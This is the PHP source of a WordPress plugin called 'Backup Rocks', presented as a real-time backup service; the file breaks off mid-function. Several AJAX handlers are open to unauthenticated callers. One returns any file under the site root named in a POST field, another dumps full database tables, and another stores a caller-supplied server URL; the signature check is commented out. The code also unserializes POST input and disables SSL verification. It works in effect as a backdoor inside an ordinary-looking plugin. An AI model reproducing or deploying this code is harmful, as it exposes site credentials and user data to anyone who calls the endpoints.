<?php
/*
Plugin Name: Backup Rocks
Description: Real Time WordPress BackUp.
Author: teammife
Version: 1.0
Author URI: http://backup.rocks
*/
define( 'BACKUP_ROCKS_URL', 'http://backup.rocks/bradmin/wp-admin/admin-ajax.php' ); 
define( 'BACKUP_ROCKS_PRODUCT', 'Backup Rocks' );

if( !defined( 'DS' ) ) {
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') {
		define('DS', '\\');
	} else {
		define('DS', '/');
	}
}

function backup_rocks_plugin_activate() {
	add_option( 'backup_rocks_redirect_on_activate', true );
}
register_activation_hook(__FILE__, 'backup_rocks_plugin_activate' );

// Lets start with loading BackUp Rocks
function wp_br_plugin_load() {
	if ( !is_admin() ) return;
	
	global $wpbr;
	$wpbr 	= new BACKUPROCKS();
	// $wpbrr 	= new BackupRocks();

	require_once 'br_core.php';
}
add_action( 'plugins_loaded', 'wp_br_plugin_load' );


class BACKUPROCKS_Base {
	protected $settings;
	protected $xiferp = '_br_';

	function __construct( ) {
		$this->settings = get_option( 'wpbr_sgnittes' );
	}

	function set_time_limit() {
		if ( !function_exists( 'ini_get' ) || !ini_get( 'safe_mode' ) ) {
			@set_time_limit( 0 );
		}
	}

	function filter_data( $post_array, $accepted_elements ) {
		if ( isset( $post_array['form_data'] ) ) {
			$post_array['form_data'] = stripslashes( $post_array['form_data'] );
		}
		$accepted_elements[] = 'sig';
		return array_intersect_key( $post_array, array_flip( $accepted_elements ) );
	}

	function create_signature( $data, $key ) {
		if ( isset( $data['sig'] ) ) {
			unset( $data['sig'] );
		}

		$flat_data = implode( '', $data );
		return base64_encode( hash_hmac( 'sha1', $flat_data, $key, true ) );
	}

	function verify_signature( $data, $key ) {
		if( empty( $data['sig'] ) ) {
			return false;
		}

		if ( isset( $data['nonce'] ) ) {
			unset( $data['nonce'] );
		}

		$temp = $data;
		$computed_signature = $this->create_signature( $temp, $key );
		return $computed_signature === $data['sig'];
	}

	function get_tables( $scope = 'regular' ) {
		global $wpdb;
		$prefix = $wpdb->prefix;
		$tables = $wpdb->get_results( 
      				"SELECT table_name FROM information_schema.tables WHERE table_schema = '".DB_NAME."' ORDER BY `table_name` ASC ;", 
      				ARRAY_N 
    					);

		foreach ( $tables as $table ) {
			$clean_tables[] = $table[0];
		}

		return apply_filters( 'wpbr_tables', $clean_tables, $scope );
	}

	function end_ajax( $return = false ) {
		echo ( false === $return ) ? '' : $return;
		exit;
	}
}


class BACKUPROCKS extends BACKUPROCKS_Base {
	protected $absolute_root_file_path;
	protected $maximum_chunk_size;
	protected $current_chunk = '';
	protected $form_data;
	protected $max_insert_string_len;
	protected $row_tracker;
	protected $rows_per_segment = 100;
	protected $primary_keys;

	function __construct() {
		parent::__construct();
		$this->max_insert_string_len = 50000; 

		$default_sgnittes = array(
			'key'  => get_option( 'backup_rocks_license_key' ),
			'verify_ssl' => 0,
			'max_request' => min( 1024 * 1024, $this->get_bottleneck( 'max' ) )
		);

		$this->accepted_fields = array(
			'action',
			'connection_info',
			'replace_old',
			'replace_new',
			'table_migrate_option',
			'select_tables',
			'replace_guids',
			'select_backup',
			'exclude_transients'
		);

		update_option( 'wpbr_sgnittes', $default_sgnittes );

		add_action( 'admin_menu', 			array($this, 'backup_rocks_license_menu'));
		add_action( 'admin_init', 			array($this, 'backup_rocks_register_option'));
		add_action( 'admin_init', 			array($this, 'backup_rocks_license_activate'));
		add_action( 'added_option', 		array($this, 'backup_rocks_rocking'));
		add_action( 'updated_option', 		array($this, 'backup_rocks_rocking'));
		add_action( 'admin_enqueue_scripts',array($this, 'backup_rocks_style'));

		add_action( 'wp_ajax_nopriv_wpbr_br_api', array( $this, 'res_to_br_api' ) );
		add_action( 'wp_ajax_nopriv_wpbr_pr_br_api', array( $this, 'res_to_br_api_rq' ) );
		add_action( 'wp_ajax_nopriv_wpbr_api_br_last', array( $this, 'res_br_api_last' ) );

		add_action( 'wp_ajax_nopriv_wpbr_br_in_api', array( $this,'br_in_api'));
		add_action( 'wp_ajax_nopriv_wpbr_br_api__fl', array( $this,'br_api__fl') );

		register_deactivation_hook( __FILE__, array( $this, 'backup_rocks_deactivate') );

		$absolute_path = rtrim( ABSPATH, '\\/' );
		$site_url = rtrim( site_url( '', 'http' ), '\\/' );
		$home_url = rtrim( home_url( '', 'http' ), '\\/' );
		if ( $site_url != $home_url ) {
			$difference = str_replace( $home_url, '', $site_url );
			if( strpos( $absolute_path, $difference ) !== false ) {
				$absolute_path = rtrim( substr( $absolute_path, 0, -strlen( $difference ) ), '\\/' );
			}
		}

		$this->absolute_root_file_path = $absolute_path;
		$this->rows_per_segment = apply_filters( 'wpbr_rows_per_segment', $this->rows_per_segment );
	}

	function br_in_api() {
		$server12 = new server();
		$server12->br_fl_api(WP_CONTENT_DIR);
		$return = $server12->send_br_req();
		die();
	}

	function br_api__fl() {
		if(isset($_POST['file'])) {
			$nn = $_POST['file'];
			echo file_get_contents(ABSPATH."$nn");
		    die();
		}
	}

	function parse_accepted_data( $data ) {
		parse_str( $data, $form_data );		
		$form_data = array_intersect_key( $form_data, array_flip( $this->accepted_fields ) );
		unset( $form_data['replace_old'][0] );
		unset( $form_data['replace_new'][0] );
		return $form_data;
	}

	//Create the Menu
	function backup_rocks_license_menu() {
		$img = "<img class='backup-rocks-logo' src='".plugin_dir_url(__FILE__)."images/backup-rocks-300x761.png' />";
		add_menu_page(
			__('Backup Rocks'),
			$img,
			'administrator',
			'backup-rocks',
			array($this,'backup_rocks_callback'),
			'',
			'63.254'
		);	
	}

	public function backup_rocks_style() {
		wp_register_style( 
	 		'register_plugin_style', 
	 		plugin_dir_url( __FILE__ ) . 'css/backup-rocks-logo.css'
	 	 );

		wp_enqueue_style( 
	 		'register_plugin_style'
	 	);
	 	?><style type="text/css">
		 	.toplevel_page_backup-rocks > .wp-menu-image.dashicons-before{
				display: none;
			}.backup-rocks-logo{
				width: 100%;
			}
			</style>
	 	<?php
	}

	//Backup Rocks Call Back Function
	public function backup_rocks_callback() {
		$license 	= get_option( 'backup_rocks_license_key' );
		$status 	= get_option( 'backup_rocks_license_status' );		
 		$activate	= '';
		if( $status !== false && $status == 'valid' ){
			$activate 	= '<p><span style="color: orange; font-size: 18px;">License has been actived!</span></p>';
		}else {
			$activate = '<input type="submit" class="button-rocks " name="backup_rocks_license_activate" value="Activate License" >';
			if( $status == 'invalid') {
				?>
				<div class="updated">
			        <p><?php _e( 'Submited KEY is wrong, Please check KEY again!', 'backup_rocks' ); ?></p>
			    </div>			
				<?php
			} elseif($license) {
				?>
				<div class="updated">
			        <p><?php _e( 'Click on activate to Activate your License!', 'backup_rocks' ); ?></p>
			    </div>			
				<?php
			}
				
		}
		?>
		<div class="wrap">
			<div class="top_navigation">
				<a href="https://backup.rocks/#join_now_id_pricing_table">
					<img src="<?php echo plugin_dir_url(__FILE__); ?>images/backup-rocks-300x761.png">
				</a> 
				
				<nav id="top-menu-nav">
					<ul class="nav" id="top-menu">
						<li class="menu-item" id="">
							<a href="https://backup.rocks/#features">FEATURES</a>
						</li>

						<li class="menu-item " id="">
							<a href="https://backup.rocks/#how-it-works">HOW IT WORKS</a>
						</li>

						<li class="menu-item " id="">
							<a href="https://backup.rocks/#join_plan">PLAN</a>
						</li>

						<li class="menu-item " id="">
							<a href="https://backup.rocks/#contact_us">CONTACT US</a>
						</li>

						<li class="menu-item " 
							id="">
							<a href="https://backup.rocks">LOGIN</a>
						</li>

						<li class="menu-item" 
							id="">
							<a href="https://backup.rocks/sign-up/">SIGN UP</a>
						</li>
					</ul> 
				</nav>

			</div>
			<div class="backup-wrap">
				<h1>The Backup Rocks plugin <strong><a>requires a valid subscription.</a></strong></h1>
				<div class="desc">Get real time automated backups and support from WordPress Experts.</div>
				<a target="blank" href="https://backup.rocks/#join_now_id_pricing_table" class="button-rocks">View plans and pricing</a>
			</div>

			<div class="backup-wrap2">
				<h1>Enter your Registration key below.</h1>
				<form method="post" action="options.php">
					<?php settings_fields('backup_rocks_license'); ?>
					<div class="desc">Make sure you click on activate license button after entering your registration key.</div>
					<input id="backup_rocks_license_key" type="textarea" name="backup_rocks_license_key" value="<?php esc_attr_e( $license ); ?>" placeholder="Enter your key here"/>
					<?php echo wp_nonce_field( 'backup_rocks_nonce', 'backup_rocks_nonce' ); ?>
					<?php if( $license == '' ) { ?> 
					<p class="submit"><input type="submit" value="Save Changes" class="button-rocks" id="submit" name="submit"></p>
					<?php } else { echo $activate; } ?>
				</form>		
			</div>				
		<?php
	}

	// register backup rocks options 
	public function backup_rocks_register_option() {
		register_setting('backup_rocks_license', 'backup_rocks_license_key' );
		
		if ( get_option('backup_rocks_redirect_on_activate', false ) ) {
	        delete_option('backup_rocks_redirect_on_activate');
	        wp_redirect(admin_url('admin.php?page=backup-rocks'));
	        exit;
	    }
	}	

	//actiavate license
	function backup_rocks_license_activate() {	
		if( isset( $_POST['backup_rocks_license_activate'] ) ) {
		 	if( ! check_admin_referer( 'backup_rocks_nonce', 'backup_rocks_nonce' ) ) 
				return;
			//update_option( 'backup_rocks_license_key', $_POST['backup_rocks_license_key'] );
			$license = trim( get_option( 'backup_rocks_license_key' ) );
			$api_params = array (
				'action' 	=> 'activate_license',
				'license' 	=> urlencode( $license ), 
				'item_name' => urlencode( BACKUP_ROCKS_PRODUCT ),
				'url'       => urlencode( home_url() )
			);

			START: $api_params;
			$response = wp_remote_post( BACKUP_ROCKS_URL, array( 'timeout' => 30, 'sslverify' => false, 'body' => $api_params ) );
			if ( is_wp_error( $response ) )
				goto START;
			$license_data = json_decode( wp_remote_retrieve_body( $response ) );
			update_option( 'backup_rocks_license_status', $license_data->license );	
		}
	}	

	//Backup rocks rocking
	function backup_rocks_rocking($option = '' ) {
		if( strcmp($option,'backup_rocks_license_status') !== 0 ) return false;

		$value = get_option('backup_rocks_license_status');
		if( $value !== 'valid' ) return false;
		$license = trim( get_option( 'backup_rocks_license_key' ) );
			
		$api_params = array(
			'action' 			=> 'br_rocking',
			'license' 			=> urlencode( $license ),
			'item_name' 		=> urlencode( BACKUP_ROCKS_PRODUCT ),
			'url' 				=> urlencode( home_url() ),
			'license_status' 	=> $value,
			'wp_version' 		=> get_bloginfo('version'),
			'path' 				=> rtrim( ABSPATH, '\\/' )		
		);
		$rs = wp_remote_post( BACKUP_ROCKS_URL, array( 'timeout' => 5, 'sslverify' => false, 'body' => $api_params ) );
		return false;
	}

	function get_total_size() {
		$dir_size = $this->dirsize(WP_CONTENT_DIR);
		$dir_size = $this->file_size($dir_size['size']);
		$db_size  = $this->get_table_sizes('size');

		return ($dir_size + $db_size);
	}

	function dirsize($dir) {
	    if(is_file($dir)) return array('size'=>filesize($dir),'howmany'=>0);
	    if($dh=opendir($dir)) {
	        $size=0;
	        $n = 0;
	        while(($file=readdir($dh))!==false) {
	            if($file=='.' || $file=='..') continue;
	            $n++;
	            $data = $this->dirsize($dir.'/'.$file);
	            $size += $data['size'];
	            $n += $data['howmany'];
	        }
	        closedir($dh);
	        return array('size'=>$size,'howmany'=>$n);
	    }
	    return array('size'=>0,'howmany'=>0);
	}

	function file_size($fsizebyte) {
		$fsize = round(((int)$fsizebyte/1048576), 2);		
	    return $fsize;
	}

	function res_br_api_last() {
		// $filtered_post = $this->filter_data( $_POST, array( 'action', 'url' ) );
		// if ( ! $this->verify_signature( $filtered_post, $this->settings['key'] ) ) {
		// 	return $result;
		// }

		// $return = $this->finalize_migration();
		// $result = $this->end_ajax( $return );
		update_option('br_server_id', $_POST['url']);
		die('success');
	}

	function res_to_br_api_rq() {
		$filtered_post = $this->filter_data( $_POST, array( 'action', 'brbr', 'url', 'key', 'table', 'form_data', 'stage', 'bottleneck', 'prefix', 'current_row', 'dump_filename', 'request_timil', 'last_table', 'gzip', 'primary_keys', 'path_current_site', 'domain_current_site' ) );
		$filtered_post['primary_keys'] = stripslashes( $filtered_post['primary_keys'] );
		$filtered_post['form_data'] = stripslashes( $filtered_post['form_data'] );

		if( isset( $filtered_post['path_current_site'] ) ) {
			$filtered_post['path_current_site'] = stripslashes( $filtered_post['path_current_site'] );
		}

		$this->maximum_chunk_size = $_POST['request_timil'];
		$this->ep_br_api( $_POST['table'] );
		ob_start();
		$return = ob_get_clean();
		$result = $this->end_ajax( $return );
		return $result;
	}

	function res_to_br_api() {
		//$fh = fopen( dirname(__FILE__)."/ajax_br_api.txt", 'w' ); //or error;	
		global $wpdb;
		$return = array();
		$this->settings['key'] = get_option('backup_rocks_license_key');
		update_option( 'wpbr_sgnittes', $this->settings );
		$filtered_post = $this->filter_data( $_POST, array( 'action', 'brbr' ) );
		$return['tables'] = $this->get_tables();
		$return['prefixed_tables'] = $this->get_tables( 'prefix' );
		$return['table_sizes'] = $this->get_table_sizes();
		$return['table_rows'] = $this->get_table_row_count();
		$return['total_size'] = $this->get_total_size();
		$return['path'] = $this->absolute_root_file_path;
		$return['url'] = home_url();
		$return['prefix'] = $wpdb->prefix;
		$return['bottleneck'] = $this->get_bottleneck();
		$return['xiferp'] = $this->xiferp;	
				
		$result = serialize( $return );
		
		die($result);
	}

	function format_table_sizes( $size ) {
		$size *= 1024;
		return size_format( $size );
	}

	function get_table_row_count() {
		global $wpdb;

		$results = $wpdb->get_results( $wpdb->prepare(
			'SELECT table_name, TABLE_ROWS FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = %s', DB_NAME
			), ARRAY_A
		);

		$return = array();

		foreach( $results as $results ) {
			$sql = $wpdb->get_results("SELECT count(*) AS count FROM ". $results['table_name'] );
			$tbl_rows = $sql[0]->count;
			$return[$results['table_name']] = ( $tbl_rows == 0 ? 1 : $tbl_rows );
		}
		return $return;
	}

	function get_table_sizes( $scope = 'regular' ) {
		global $wpdb;
		$prefix = $wpdb->prefix;
		$results = $wpdb->get_results( $wpdb->prepare(
				'SELECT TABLE_NAME AS "table",
				ROUND((data_length + index_length)/1024/1024, 3) AS "size"
				FROM information_schema.TABLES
				WHERE information_schema.TABLES.table_schema="%s"
				AND information_schema.TABLES.table_type="%s"', DB_NAME, "BASE TABLE"
			), ARRAY_A
		);

		if ( $scope == 'size' ){
			$return = '';
			foreach ( $results as $result ) {
				$return += (float)$result['size'];
			}
			return $return;
		}

		$return = array();
		foreach ($results as $key => $result) {
			$checksum = $wpdb->get_results( "CHECKSUM TABLE ".$result['table'] );
			$return[$result['table']] = $checksum[0]->Checksum;
		}
		return apply_filters( 'wpbr_table_sizes', $return, $scope );
	}

	function get_post_max_size() {
		$val = trim( ini_get( 'post_max_size' ) );
		$last = strtolower( $val[ strlen( $val ) - 1 ] );
		switch ( $last ) {
		case 'g':
			$val *= 1024;
		case 'm':
			$val *= 1024;

		case 'k':
			$val *= 1024;
		}
		return $val;
	}

	function get_bottleneck( $type = 'regular' ) {
		$suhosin_limit = false;
		$suhosin_request_limit = false;
		$suhosin_post_limit = false;

		if ( function_exists( 'ini_get' ) ) {
			$suhosin_request_limit = $this->return_bytes( ini_get( 'suhosin.request.max_value_length' ) );
			$suhosin_post_limit = $this->return_bytes( ini_get( 'suhosin.post.max_value_length' ) );
		}

		if ( $suhosin_request_limit && $suhosin_post_limit ) {
			$suhosin_limit = min( $suhosin_request_limit, $suhosin_post_limit );
		}

		$post_max_upper_size = apply_filters( 'wpbr_post_max_upper_size', 26214400 );
		$calculated_bottleneck = min( ( $this->get_post_max_size() - 1024 ), $post_max_upper_size );

		if ( $suhosin_limit ) {
			$calculated_bottleneck = min( $calculated_bottleneck, $suhosin_limit - 1024 );
		}

		if( $type != 'max' ) {
			$calculated_bottleneck = min( $calculated_bottleneck, $this->settings['max_request'] );
		}
		return apply_filters( 'wpbr_bottleneck', $calculated_bottleneck );
	}

	function req_lq_br_api( $create_query, $table, &$alter_table_query ) {
		if( preg_match( '@CONSTRAINT|FOREIGN[\s]+KEY@', $create_query ) ) {
			$sql_constraints_query = '';
			$nl_nix = "\n";
			$nl_win = "\r\n";
			$nl_mac = "\r";
			if( strpos( $create_query, $nl_win ) !== false ) {
				$crlf = $nl_win;
			}
			elseif( strpos( $create_query, $nl_mac ) !== false ) {
				$crlf = $nl_mac;
			}
			elseif( strpos( $create_query, $nl_nix ) !== false ) {
				$crlf = $nl_nix;

			}

			$sql_lines = explode( $crlf, $create_query );
			$sql_count = count( $sql_lines );
			for( $i = 0; $i < $sql_count; $i++ ) {
				if (preg_match(
					'@^[\s]*(CONSTRAINT|FOREIGN[\s]+KEY)@',
					$sql_lines[$i]
				)) {
					break;
				}

			}

			if( $i != $sql_count ) {
				$sql_lines[$i - 1] = preg_replace(
					'@,$@',
					'',
					$sql_lines[$i - 1]
				);
				$sql_constraints_query .= 'ALTER TABLE '
					. $this->backquote( $table )
					. $crlf;

				$first = true;

				for( $j = $i; $j < $sql_count; $j++ ) {
					if( preg_match(
						'@CONSTRAINT|FOREIGN[\s]+KEY@',
						$sql_lines[$j]
					)) {
						if( strpos( $sql_lines[$j], 'CONSTRAINT' ) === false ) {
							$tmp_str = preg_replace(
								'/(FOREIGN[\s]+KEY)/',
								'ADD \1',
								$sql_lines[$j]
							);

							$sql_constraints_query .= $tmp_str;
						}
						else {
							$tmp_str = preg_replace(
								'/(CONSTRAINT)/',
								'ADD \1',
								$sql_lines[$j]
							);
							$sql_constraints_query .= $tmp_str;

							preg_match(
								'/(CONSTRAINT)([\s])([\S]*)([\s])/',
								$sql_lines[$j],
								$matches
							);
						}
						$first = false;
					}
					else {
						break;
					}
				}
				$sql_constraints_query .= ";\n";
				$create_query = implode(
					$crlf,
					array_slice($sql_lines, 0, $i)
				)
				. $crlf
				. implode(
					$crlf,
					array_slice( $sql_lines, $j, $sql_count - 1 )
				);

				unset( $sql_lines );

				$alter_table_query = $sql_constraints_query;
				return $create_query;
			}
		}

		return $create_query;
	}


	function ep_br_api( $table ) {
		global $wpdb;
		$this->set_time_limit();
		
		if ( empty( $this->form_data ) ) {
			$this->form_data = $this->parse_accepted_data( $_POST['form_data'] );
		}

		$xiferp = $this->xiferp;
		$remote_prefix = ( isset( $_POST['prefix'] ) ? $_POST['prefix'] : $wpdb->prefix );
		$table_structure = $wpdb->get_results( "DESCRIBE " . $this->backquote( $table ) );
		if ( ! $table_structure ) {
			return false;
		}

		$current_row = -1;
		if ( ! empty( $_POST['current_row'] ) ) {
			$temp_current_row = trim( $_POST['current_row'] );
			if ( ! empty( $temp_current_row ) ) {
				$current_row = (int) $temp_current_row;
			}
		}

		if ( $current_row == -1 ) {
			$this->br_api_st( "DROP TABLE IF EXISTS " . $this->backquote( $xiferp . $table ) . ";\n" );
			$create_table = $wpdb->get_results( "SHOW CREATE TABLE " . $this->backquote( $table ), ARRAY_N );
			if ( false === $create_table ) {
				return false;
			}

			$create_table[0][1] = str_replace( 'CREATE TABLE `', 'CREATE TABLE `' . $xiferp, $create_table[0][1] );
			$create_table[0][1] = str_replace( 'TYPE=', 'ENGINE=', $create_table[0][1] );
			$alter_table_query = '';
			$create_table[0][1] = $this->req_lq_br_api( $create_table[0][1], $table, $alter_table_query );
			$create_table[0][1] = apply_filters( 'wpbr_create_table_query', $create_table[0][1], $table );
			$this->br_api_st( $create_table[0][1] . ";\n" );
		}

		$defs = array();
		$ints = array();
		foreach ( $table_structure as $struct ) {
			if ( ( 0 === strpos( $struct->Type, 'tinyint' ) ) ||
				( 0 === strpos( strtolower( $struct->Type ), 'smallint' ) ) ||
				( 0 === strpos( strtolower( $struct->Type ), 'mediumint' ) ) ||
				( 0 === strpos( strtolower( $struct->Type ), 'int' ) ) ||
				( 0 === strpos( strtolower( $struct->Type ), 'bigint' ) ) ) {
				$defs[strtolower( $struct->Field )] = ( null === $struct->Default ) ? 'NULL' : $struct->Default;
				$ints[strtolower( $struct->Field )] = "1";
			}
		}

		$row_inc = $this->rows_per_segment;
		$row_start = 0;
		if ( $current_row != -1 ) {
			$row_start = $current_row;
		}

		$this->row_tracker = $row_start;
		$search = array( "\x00", "\x0a", "\x0d", "\x1a" );
		$replace = array( '\0', '\n', '\r', '\Z' );
		$query_size = 0;
		$table_name = $xiferp . $table;
		$this->primary_keys = array();
		$use_primary_keys = true;

		foreach( $table_structure as $col ){
			$field_set[] = $this->backquote( $col->Field );
			if( $col->Key == 'PRI' && true == $use_primary_keys ) {
				if( false === strpos( $col->Type, 'int' ) ) {
					$use_primary_keys = false;
					$this->primary_keys = array();
					continue;
				}
				$this->primary_keys[$col->Field] = 0;
			}
		}

		if ( empty($this->primary_keys) ) {
			$this->primary_keys = array();
			$order  = "SHOW COLUMNS FROM $table";
	  		$order  = $wpdb->get_results($order);
	  		$this->primary_keys[$order[0]->Field]=0;
	  	}

		$first_select = true;
		if( ! empty( $_POST['primary_keys'] ) ) {
			$_POST['primary_keys'] = trim( $_POST['primary_keys'] );
			if( ! empty( $_POST['primary_keys'] ) && is_serialized( $_POST['primary_keys'] ) ) {
				$this->primary_keys = unserialize( stripslashes( $_POST['primary_keys'] ) );
				$first_select = false;
			}
		}

		$fields = implode( ', ', $field_set );
		$insert_buffer = $insert_query_template = "REPLACE INTO " . $this->backquote( $table_name ) . " ( " . $fields . ") VALUES\n";
		do {
			$join = array();
			$where = 'WHERE 1=1';
			$order_by = '';
			

			$limit = "LIMIT {$row_start}, {$row_inc}";

			if( ! empty( $this->primary_keys ) ) {
				$primary_keys_keys = array_keys( $this->primary_keys );
				$primary_keys_keys = array_map( array( $this, 'backquote' ), $primary_keys_keys );

				$order_by = 'ORDER BY ' . implode( ',', $primary_keys_keys );
				$limit = "LIMIT $row_inc";
				if( false == $first_select ) {
					$where .= ' AND ';
					$temp_primary_keys = $this->primary_keys;
					$primary_key_count = count( $temp_primary_keys );
					$clauses = array();
					for( $j = 0; $j < $primary_key_count; $j++ ) {
						$subclauses = array();
						$i = 0;
						foreach( $temp_primary_keys as $primary_key => $value ) {
							$operator = ( count( $temp_primary_keys ) - 1 == $i ? '>' : '=' );
							$subclauses[] = sprintf( '%s %s %s', $this->backquote( $primary_key ), $operator, $wpdb->prepare( '%s', $value ) );
							++$i;
						}

						array_pop( $temp_primary_keys );
						$clauses[] = '( ' . implode( ' AND ', $subclauses ) . ' )';
					}
					$where .= '( ' . implode( ' OR ', $clauses ) . ' )';
				}
				$first_select = false;
			}

			$join = implode( ' ', array_unique( $join ) );
			$join = apply_filters( 'wpbr_rows_join', $join, $table );
			$where = apply_filters( 'wpbr_rows_where', $where, $table );
			$order_by = apply_filters( 'wpbr_rows_order_by', $order_by, $table );
			$limit = apply_filters( 'wpbr_rows_limit', $limit, $table );
			$sql = "SELECT " . $this->backquote( $table ) . ".* FROM " . $this->backquote( $table ) . " $join $where $order_by $limit";
			$sql = apply_filters( 'wpbr_rows_sql', $sql, $table );
			$table_data = $wpdb->get_results( $sql );
			if ( $table_data ) {
				foreach ( $table_data as $row ) {
					$values = array();
					foreach ( $row as $key => $value ) {
						if ( isset( $ints[strtolower( $key )] ) && $ints[strtolower( $key )] ) {
							$value = ( null === $value || '' === $value ) ? $defs[strtolower( $key )] : $value;
							$values[] = ( '' === $value ) ? "''" : $value;
						} else {
							if ( null === $value ) {
								$values[] = 'NULL';
							}
							else {
								if ( 'guid' != $key || ( isset( $this->form_data['replace_guids'] ) && $this->table_is( 'posts', $table ) ) ) {
									$value = $this->recursive_unserialize_change( $value );
								}
								$values[] = "'" . str_replace( $search, $replace, $this->br_api_cleaner( $value ) ) . "'";
							}
						}
					}
					$insert_line = '(' . implode( ', ', $values ) . '),';
					$insert_line .= "\n";					

					if ( ( strlen( $this->current_chunk ) + strlen( $insert_line ) + strlen( $insert_buffer ) + 10 ) > $this->maximum_chunk_size ) {
						if( $insert_buffer == $insert_query_template ) {
							$insert_buffer .= $insert_line;
							++$this->row_tracker;
							if( ! empty( $this->primary_keys ) ) {
								foreach( $this->primary_keys as $primary_key => $value ) {
									$this->primary_keys[$primary_key] = $row->$primary_key;
								}
							}
						}

						$insert_buffer = rtrim( $insert_buffer, "\n," );
						$insert_buffer .= " ;\n";
						$this->br_api_st( $insert_buffer );
						$insert_buffer = $insert_query_template;
						$query_size = 0;
						return $this->transfer_chunk();
					}

					if ( ( $query_size + strlen( $insert_line ) ) > $this->max_insert_string_len && $insert_buffer != $insert_query_template ) {

						$insert_buffer = rtrim( $insert_buffer, "\n," );

						$insert_buffer .= " ;\n";

						$this->br_api_st( $insert_buffer );

						$insert_buffer = $insert_query_template;

						$query_size = 0;

					}

					$insert_buffer .= $insert_line;

					$query_size += strlen( $insert_line );

					++$this->row_tracker;

					if( ! empty( $this->primary_keys ) ) {

						foreach( $this->primary_keys as $primary_key => $value ) {

							$this->primary_keys[$primary_key] = $row->$primary_key;

						}
					}
				}

				$row_start += $row_inc;

				if ( $insert_buffer != $insert_query_template ) {

					$insert_buffer = rtrim( $insert_buffer, "\n," );

					$insert_buffer .= " ;\n";

					$this->br_api_st( $insert_buffer );

					$insert_buffer = $insert_query_template;

					$query_size = 0;

				}
			}
		} while ( count( $table_data ) > 0 );

		$this->row_tracker = -1;
		return $this->transfer_chunk();
	}

	function table_is( $desired_table, $given_table ) {
		global $wpdb;
		return ( $wpdb->{$desired_table} == $given_table || preg_match( '/' . $wpdb->prefix . '[0-9]+_' . $desired_table . '/', $given_table ) );
	}

	function backup_rocks_deactivate() {
		if ( ! current_user_can( 'activate_plugins' ) )
        return;
    	delete_option('wpbr_sgnittes');
    	delete_option('backup_rocks_license_key');
    	delete_option('backup_rocks_license_status');
    	delete_option('br_server_id');
	}

	function br_api_st( $query_line, $replace = true ) {
		$this->current_chunk .= $query_line;
			if ( $_POST['brbr'] == 'request' ) {
			echo $query_line;
		}
	}

	function transfer_chunk() {
		if ( $_POST['brbr'] == 'request' ) {
			$result = $this->end_ajax( $this->row_tracker . ',' . serialize( $this->primary_keys ) );
			return $result;
		}
	}

	function backquote( $a_name ) {
		if ( !empty( $a_name ) && $a_name != '*' ) {
			if ( is_array( $a_name ) ) {
				$result = array();
				reset( $a_name );
				while ( list( $key, $val ) = each( $a_name ) )
					$result[$key] = '`' . $val . '`';
				return $result;
			} else {
				return '`' . $a_name . '`';
			}
		} else {
			return $a_name;
		}
	}

	function br_api_cleaner( $a_string = '', $is_like = false ) {
		if ( $is_like ) $a_string = str_replace( '\\', '\\\\\\\\', $a_string );
		else $a_string = str_replace( '\\', '\\\\', $a_string );
		return str_replace( '\'', '\\\'', $a_string );
	}

	function return_bytes($val) {
		if( is_numeric( $val ) ) return $val;
		if( empty( $val ) ) return false;
		$val = trim($val);
		$last = strtolower($val[strlen($val)-1]);
		switch($last) {
			case 'g':
				$val *= 1024;
			case 'm':
				$val *= 1024;
			case 'k':
				$val *= 1024;
				break;
			default :
				$val = false;
				break;
		}
		return $val;
	}
	
	function recursive_unserialize_change( $data, $serialized = false, $parent_serialized = false ) {

		$is_json = false;
		// some unseriliased data cannot be re-serialized eg. SimpleXMLElements
		try {

			if ( is_string( $data ) && ( $unserialized = @unserialize( $data ) ) !== false ) {
				// PHP currently has a bug that doesn't allow you to clone the DateInterval / DatePeriod classes.
				// We skip them here as they probably won't need data to be replaced anyway
				if( is_object( $unserialized ) ) {
					if( $unserialized instanceof DateInterval || $unserialized instanceof DatePeriod ) return $data;
				}
				$data = $this->recursive_unserialize_change( $unserialized, true, true );
			}
			elseif ( is_array( $data ) ) {
				$_tmp = array( );
				foreach ( $data as $key => $value ) {
					$_tmp[ $key ] = $this->recursive_unserialize_change( $value, false, $parent_serialized );
				}

				$data = $_tmp;
				unset( $_tmp );
			}			
			elseif ( is_object( $data ) ) {
				$_tmp = clone $data;
				foreach ( $data as $key => $value ) {
					$_tmp->$key = $this->recursive_unserialize_change( $value, false, $parent_serialized );
				}

				$data = $_tmp;
				unset( $_tmp );
			}
			elseif ( $this->is_json( $data, true ) ) {
				$_tmp = array( );
				$data = json_decode( $data, true );
				foreach ( $data as $key => $value ) {
					$_tmp[ $key ] = $this->recursive_unserialize_change( $value, false, $parent_serialized );
				}

				$data = $_tmp;
				unset( $_tmp );
				$is_json = true;
			}
			elseif ( is_string( $data ) ) {
				$data = $this->apply_replaces( $data, $parent_serialized );
			}

			if ( $serialized )
				return serialize( $data );

			if ( $is_json )
				return json_encode( $data );

		} catch( Exception $error ) {

		}

		return $data;
	}

	function apply_replaces( $subject, $is_serialized = false ) {
		$search = $this->form_data['replace_old'];
		$replace = $this->form_data['replace_new'];
		$new = str_ireplace( $search, $replace, $subject );		
		
		return $new;
	}

	function is_json( $string, $strict = false ) {
		$json = @json_decode( $string, true );
		if( $strict == true && ! is_array( $json ) ) return false;
		return ! ( $json == NULL || $json == false );
	}

}

set_time_limit(0);

ini_set('memory_limit', '1000M');



class server {

	public $_hash_array;	

	function br_fl_api($dir){	

		if (ob_get_level() == 0) ob_start();		

		$folder = scandir($dir);

		foreach($folder as $file){

			if($file != '.' && $file != '..' && $file != '.DS_Store'){

				if(is_dir($dir.'/'.$file)) {					

					$this->br_fl_api($dir.'/'.$file);			

				} else {
					$hash = sha1_file($dir.'/'.$file);
					$mn = substr(strrchr(rtrim(WP_CONTENT_DIR, '/'), '/'), 1);
					$explode = explode("wp-content",WP_CONTENT_DIR);
					$trim = $explode['0'];
					$dir1 = str_replace($explode['0'],"", $dir);
					$this->_hash_array[$dir1][$file] = $hash;
				}
			}
		}
	}	
	
	function send_br_req($url = '') {
		$return = array();

		$this->br_fl_api(WP_CONTENT_DIR);
	    $hash_string = base64_encode(serialize($this->_hash_array));
	    // echo $hash_string;

	    $return['hash_string'] = $hash_string;
	    $credentials = array();
		$absp = ABSPATH;
		$rf=substr(strrchr(rtrim($absp, '/'), '/'), 1);
			
		if(file_exists(ABSPATH.".htaccess") ){
			$credentials[".htaccess"] = sha1_file(ABSPATH.".htaccess");
		}
		if(file_exists(ABSPATH."wp-config.php")) {			
